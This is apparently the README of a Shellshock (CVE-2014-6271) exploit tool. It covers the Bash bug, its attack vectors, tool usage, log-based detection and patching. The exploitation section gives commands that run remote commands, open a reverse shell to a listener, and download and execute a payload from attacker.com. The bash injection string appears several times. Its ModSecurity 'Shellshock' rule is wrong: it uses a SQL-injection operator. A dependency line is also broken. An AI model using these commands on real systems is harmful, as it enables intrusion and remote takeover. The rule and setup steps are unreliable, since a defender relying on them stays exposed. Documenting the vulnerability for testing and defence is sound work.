Shellshock (CVE-2014-6271)
==========================

**Original Discovery:** St√©phane Chazelas  
**Adapted by:**         Hyperion Gray Security Research Team  
**Date:**               2014-09-24 (discovery) / 2024-11-16 (adaptation)  
**CVE:**                [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)  
**CVSS Score:**         10.0 (Critical)  
**Advisory:**           https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271  
**Tested on:**          Bash versions 1.14 through 4.3

Overview
--------

CVE-2014-6271, known as "Shellshock", is a critical vulnerability in GNU Bash (Bourne Again Shell) that allows arbitrary command execution. The vulnerability exists in how Bash processes environment variables that contain function definitions. When Bash encounters specially crafted environment variables, it continues to process commands after the function definition, leading to arbitrary command execution.

Shellshock is particularly dangerous because Bash is widely used in web servers (via CGI scripts), DHCP clients, SSH servers, and many other network-accessible services. The vulnerability can be exploited remotely through various attack vectors, making it one of the most significant security vulnerabilities discovered in recent years.

The bug has existed in Bash for over 20 years, affecting virtually every Unix-like system including Linux, macOS, and various embedded devices. The vulnerability allows attackers to execute arbitrary commands with the privileges of the vulnerable application, often leading to complete system compromise.

Affected Versions
----------------

**Vulnerable Bash Versions:**
- GNU Bash 1.14 through 4.3 (all versions prior to patches)
- Bash 4.3 patch level 25 and earlier
- Bash 4.2 patch level 53 and earlier  
- Bash 4.1 patch level 17 and earlier
- Bash 4.0 patch level 44 and earlier
- Bash 3.2 patch level 57 and earlier
- All earlier versions

**Patched Versions:**
- Bash 4.3 patch level 26 and later
- Bash 4.2 patch level 54 and later
- Bash 4.1 patch level 18 and later
- Bash 4.0 patch level 45 and later
- Bash 3.2 patch level 58 and later

**Systems Affected:**
- Linux distributions (all major distributions)
- macOS (OS X) systems
- FreeBSD, OpenBSD, NetBSD
- Embedded devices (routers, IoT devices, etc.)
- Network appliances and security devices
- Web servers running CGI scripts
- Any system using Bash for processing environment variables

Technical Details
----------------

The Shellshock vulnerability exists in Bash's environment variable processing code. When Bash starts up, it processes environment variables to look for function definitions. The vulnerability occurs because Bash continues to parse and execute commands that appear after a function definition in an environment variable.

**Normal Function Definition:**
```bash
# Normal environment variable function definition
env 'x=() { :;}; echo vulnerable' bash -c "echo test"
```

**Vulnerable Code Flow:**
1. **Environment Processing:** Bash scans environment variables for function definitions
2. **Function Parsing:** Finds variable starting with `() {`
3. **Function Definition:** Processes the function definition normally
4. **Continued Parsing:** BUG: Continues parsing after function ends
5. **Command Execution:** Executes additional commands found after function

**Memory Layout and Parsing:**
```
Environment Variable: x=() { :; }; echo "VULNERABLE"
                        ^function^  ^executed code^
                        
Bash Parser Flow:
1. Detects function syntax: () {
2. Parses function body: :; }
3. VULNERABILITY: Continues parsing after }
4. Executes: echo "VULNERABLE"
```

**Attack Vectors:**

1. **CGI Scripts (Most Common):**
   - HTTP headers become environment variables
   - User-Agent, Referer, Cookie headers exploitable
   - Web servers pass headers to CGI scripts via Bash

2. **SSH Forced Commands:**
   - SSH_ORIGINAL_COMMAND environment variable
   - Exploitable through SSH key restrictions

3. **DHCP Client Scripts:**
   - DHCP options become environment variables
   - Network-based exploitation possible

4. **Mail Servers:**
   - Email headers processed by Bash scripts
   - Procmail and other mail processors vulnerable

5. **Git and Version Control:**
   - Git hooks and scripts using Bash
   - Repository-based exploitation

**Exploitation Characteristics:**
- **Remote Exploitable:** Through web requests, SSH, DHCP, etc.
- **No Authentication Required:** In many attack scenarios
- **Privilege Escalation:** Executes with application privileges
- **Persistent:** Can install backdoors and maintain access
- **Wormable:** Can spread through network services

Installation
-----------

Install required dependencies:

```bash
pip install requests urllib3 threading
```

For advanced exploitation features:
```bash
pip install paramiko  # For SSH-based testing
pip install scapy    # For DHCP-based testing (requires root)
```

Usage
-----

### Web Application Testing

Test web applications for Shellshock via HTTP headers:

```bash
# Basic web application test
python exploit.py -t http://example.com/cgi-bin/test.cgi

# Test with custom User-Agent
python exploit.py -t http://example.com/cgi-bin/test.cgi --user-agent

# Test multiple CGI endpoints
python exploit.py -t http://example.com --scan-cgi

# Test with custom payload
python exploit.py -t http://example.com/cgi-bin/test.cgi --payload "id"
```

### SSH Server Testing

Test SSH servers for Shellshock in forced commands:

```bash
# Test SSH server (requires credentials)
python exploit.py --ssh user@example.com --password password123

# Test with SSH key
python exploit.py --ssh user@example.com --key-file ~/.ssh/id_rsa

# Test SSH forced command vulnerability
python exploit.py --ssh user@example.com --test-forced-command
```

### Batch Testing

Test multiple targets from various sources:

```bash
# Test from URL list
python exploit.py -f urls.txt

# Test IP range for common CGI paths
python exploit.py --ip-range 192.168.1.0/24 --scan-cgi

# Test with multiple attack vectors
python exploit.py -t http://example.com --all-vectors
```

### Advanced Options

```bash
# Custom HTTP headers for testing
python exploit.py -t http://example.com/cgi-bin/test.cgi --header "X-Custom: value"

# Test with proxy
python exploit.py -t http://example.com --proxy http://proxy:8080

# Verbose output with request/response details
python exploit.py -t http://example.com -v

# Save results to file
python exploit.py -f targets.txt -o results.txt

# Test with custom timeout
python exploit.py -t http://example.com --timeout 30
```

### Exploitation Mode

**WARNING:** Only use against systems you own or have explicit permission to test.

```bash
# Execute commands on vulnerable target
python exploit.py -t http://example.com/cgi-bin/test.cgi --exploit --cmd "whoami"

# Reverse shell payload
python exploit.py -t http://example.com/cgi-bin/test.cgi --exploit --reverse-shell 192.168.1.100:4444

# Download and execute payload
python exploit.py -t http://example.com/cgi-bin/test.cgi --exploit --download-exec http://attacker.com/payload.sh
```

Detection
---------

**Web Server Log Analysis:**
```bash
# Look for Shellshock patterns in access logs
grep -E "\(\s*\)\s*\{" /var/log/apache2/access.log
grep -E "User-Agent.*\(\s*\)\s*\{" /var/log/nginx/access.log

# Check for suspicious User-Agent strings
grep -i "() {" /var/log/httpd/access_log
```

**Network-based Detection:**
- Monitor HTTP requests with function definitions in headers
- Look for unusual User-Agent, Referer, or Cookie values
- Detect requests to CGI endpoints with suspicious headers
- Monitor for outbound connections from web servers

**Host-based Detection:**
- Check Bash version: `bash --version`
- Test local system: `env 'x=() { :;}; echo vulnerable' bash -c "echo test"`
- Monitor process execution from web server processes
- Check for unauthorized file modifications

**Security Tools and Signatures:**
- Snort/Suricata rules for Shellshock detection
- ModSecurity WAF rules
- IDS/IPS signatures for HTTP-based attacks
- YARA rules for Shellshock payloads

**Indicators of Compromise:**
- Unusual process execution from web server
- Unexpected network connections from system processes
- New files in web directories or system locations
- Modified system configuration files
- Suspicious entries in command history

Mitigation
----------

### Immediate Actions

1. **Update Bash to Patched Version:**
   ```bash
   # Check current version
   bash --version
   
   # Update Bash (Ubuntu/Debian)
   sudo apt-get update && sudo apt-get upgrade bash
   
   # Update Bash (CentOS/RHEL)
   sudo yum update bash
   
   # Update Bash (macOS with Homebrew)
   brew install bash
   ```

2. **Test for Vulnerability:**
   ```bash
   # Test if system is vulnerable
   env 'x=() { :;}; echo vulnerable' bash -c "echo test"
   
   # Should only output "test" if patched
   # If it outputs "vulnerable" and "test", system is vulnerable
   ```

3. **Disable CGI if Not Needed:**
   ```bash
   # Apache - disable CGI module
   sudo a2dismod cgi
   sudo a2dismod cgid
   sudo systemctl restart apache2
   
   # Nginx - remove CGI configuration
   # Edit nginx.conf and remove fastcgi_pass directives for CGI
   ```

4. **Web Application Firewall (WAF) Rules:**
   ```bash
   # ModSecurity rule example
   SecRule REQUEST_HEADERS "@detectSQLi" \
       "id:1001,\
       phase:2,\
       block,\
       msg:'Shellshock Attack Detected',\
       logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
       t:none,\
       t:urlDecodeUni,\
       t:htmlEntityDecode,\
       t:normalisePathWin,\
       setvar:'tx.anomaly_score=+%{tx.critical_anomaly_score}',\
       setvar:tx.shellshock_score=+1"
   ```

### Long-term Security Measures

**System Hardening:**
- Remove or disable unnecessary CGI scripts
- Use application servers instead of CGI where possible
- Implement least privilege principles for web server processes
- Regular security updates and patch management

**Network Security:**
- Deploy Web Application Firewalls (WAF)
- Implement network segmentation
- Monitor and log all web server traffic
- Use intrusion detection/prevention systems

**Application Security:**
- Code review for Bash usage in applications
- Replace Bash scripts with safer alternatives where possible
- Input validation and sanitization
- Use containerization to limit impact

**Monitoring and Response:**
- Implement security information and event management (SIEM)
- Set up alerts for suspicious web server activity
- Regular vulnerability scanning
- Incident response procedures for compromise

Real-World Impact
----------------

Shellshock has been one of the most widely exploited vulnerabilities:

**Initial Impact (September 2014):**
- Millions of systems vulnerable worldwide
- Immediate exploitation within hours of disclosure
- Botnet recruitment campaigns targeting vulnerable systems
- Cryptocurrency mining malware deployment

**Attack Campaigns:**
- **Mayhem Botnet:** Exploited Shellshook for botnet recruitment
- **Cryptocurrency Miners:** Used vulnerability to install mining software
- **DDoS Botnets:** Recruited vulnerable systems for DDoS attacks
- **Web Shell Installation:** Persistent backdoor installation

**Affected Industries:**
- Web hosting providers and shared hosting
- Government and military systems
- Financial institutions
- Healthcare organizations
- Educational institutions
- IoT and embedded device manufacturers

**Long-term Consequences:**
- Increased focus on open source security auditing
- Enhanced vulnerability disclosure processes
- Improved patch management practices
- Greater awareness of supply chain security risks

**Ongoing Threat:**
- Legacy systems still vulnerable years later
- Embedded devices with unpatched Bash
- IoT devices with outdated firmware
- Industrial control systems and SCADA

References
----------

- [CVE-2014-6271 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Red Hat Security Advisory](https://access.redhat.com/security/cve/cve-2014-6271)
- [US-CERT Alert TA14-268A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa14-268a)
- [Bash Official Security Notice](https://ftp.gnu.org/gnu/bash/)
- [Akamai Shellshock Analysis](https://blogs.akamai.com/2014/09/environment-bashing.html)
- [Cloudflare Shellshock Report](https://blog.cloudflare.com/inside-shellshock/)

Legal Notice
-----------

This tool is provided for educational and authorized security testing purposes only.
Unauthorized access to computer systems is illegal and may violate local, state, federal,
or international laws. Always obtain explicit written permission before testing any system
you do not own.

Shellshock has been used in numerous criminal attacks and botnet operations. Use of this
tool against systems without permission may result in severe legal consequences. Users are
solely responsible for compliance with all applicable laws.

This tool should only be used by security professionals for legitimate security testing,
research, and educational purposes in controlled environments.